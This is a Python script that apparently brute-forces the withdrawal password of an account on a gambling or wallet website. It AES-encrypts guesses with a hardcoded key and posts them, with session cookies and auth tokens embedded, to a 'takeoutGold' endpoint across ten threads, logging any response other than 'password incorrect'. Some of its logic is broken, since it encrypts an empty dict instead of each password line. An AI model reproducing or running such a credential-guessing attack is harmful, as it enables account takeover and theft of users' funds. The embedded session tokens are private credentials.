import base64
import time
import requests

from Crypto.Cipher import AES
from concurrent.futures import ThreadPoolExecutor


class DeAesCrypt:
    """
    AES-128-CBC解密
    """

    def __init__(self, key=None, iv=None, pad="zero"):
        """
        :param data: 加密后的字符串
        :param key: 随机的16位字符
        :param pad:  填充方式
        """
        self.key = key.encode("utf-8")
        self.pad = pad.lower()
        self.iv = iv.encode("utf-8")

    def zeropadding(self, text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def decrypt_aes(self, data):
        real_data = base64.b64decode(data)
        my_aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypt_data = my_aes.decrypt(real_data)
        return self.get_str(decrypt_data)

    def encyrpt_aes(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        content_padding = self.zeropadding(data)
        # 加密
        encrypt_bytes = cipher.encrypt(content_padding)
        # 重新编码
        result = str(base64.b64encode(encrypt_bytes), encoding='utf-8')
        return result

    def get_str(self, bd):
        """解密后的数据去除加密前添加的数据"""
        if self.pad == "zero":  # 去掉数据在转化前不足16位长度时添加的ASCII码为0编号的二进制字符
            return ''.join([chr(i) for i in bd if i != 0])

        # elif self.pad == "pkcs7":  # 去掉pkcs7模式中添加后面的字符
        #     return ''.join([chr(i) for i in i > 32])  # 此处报错，在我环境

        else:
            return "不存在此种数据填充方式"


cookies = {
    'session_sslproxy_server': 'c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc',
    'UserKey': 'povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU',
    '_vid_t': '+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
}

headers = {
    'authority': 'www.4424477.com',
    'accept': 'application/json, text/plain, *6/*',
    'accept-language': 'zh',
    'auth': 'PDVeHfDXg2h2l1OrxN5fPYDUgW0qkH-wRME39zboQgTIaW-xDq_aXC_fxeKd13_uUJo6mJAvrAuW1U3oeOTZvd197qJfRCcRDUvSP_EtuIPLZ3Gv-riYlxf20NWU4fEcNt7O56YMS_m2blJ808pUWqVGj83_FHuQDC4esfXdld8tOB8mzSEhbym4uI4v_dGK-QTvdF-j4lWF27Awcud2CneVJVAITNPV8myns5h6Tbb_GZnyIDWnS6zQhRfgaP2TiKTAkOUazEb5nd_rd7UQGHo_c9s9h5EDNSDajNNkTtwpS-ss1sufNozYPVNh8nJo3fNKrl4T-tUVMK8Lk50-wQ',
    'browserfingerid': 'SWZS2wpfkd0K8ySSUbaa',
    'clienttimezone': 'UTC+8',
    'content-type': 'text/plain',
    # 'cookie': 'session_sslproxy_server=c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc; UserKey=povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU; _vid_t=+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
    'currency': 'CNY',
    'data-uuid': 'data-uuid-42',
    'device': '657c402a-39cf-47ad-bc30-eb96fbcae2b6',
    'devicemodel': 'windows',
    'domain': 'www.4424477.com',
    'language': 'zh',
    'nonce': 'eec5d2e1-84ab-491e-9fe9-2ce4fa8505e8',
    'origin': 'https://www.4424477.com',
    'platformtype': '5',
    'referer': 'https://www.4424477.com/home/yuebao?id=18538137',
    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sign': '65umdncUL15M+8fESDOTkvmAW1FyTVFFFxouL6NHRolscxXfoU6NSwFJguicMaDL',
    'sitecode': '128',
    'timestamp': '1679233564',
    'token': '4423772043da9659c4dc1679233551632545283',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'x-request-id': 'eec5d2e1-84ab-491e-9fe9-2ce4fa8505e8',
}


def bao_po(aes_obj=None, file_name=None, wirte_file=None):
    with open(file_name, "r") as f:
        for line in f.readlines():
            try:
                content = {}
                payload = aes_obj.encyrpt_aes(content)
                response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,
                                         headers=headers, data=payload)
                res = response.json()
                if "密码不正确" == res.get("msg"):
                    # print(content, res)
                    pass
                else:
                    with open(wirte_file, "a") as file:
                        file.write(content, res, "\r")
                    print("other:", content, res, payload)
            except Exception as e:
                # print(e.__traceback__.tb_frame.f_globals["__file__"], e.__traceback__.tb_frame.f_lineno)
                with open(wirte_file, "a") as file:
                    file.write(content, res, "\r")
                print(str(e), "位置:", content, payload)
                time.sleep(5)
                continue


if __name__ == '__main__':
    key = "8325b1d23ff2eeb4"
    iv = "5421698523412578"
    aes_obj = DeAesCrypt(key, iv)
    pool = ThreadPoolExecutor(10)
    for i in range(0, 10):
        pool.submit(bao_po, aes_obj, "pass" + f"{i}.txt", "corr_pass" + f"{i}.txt")
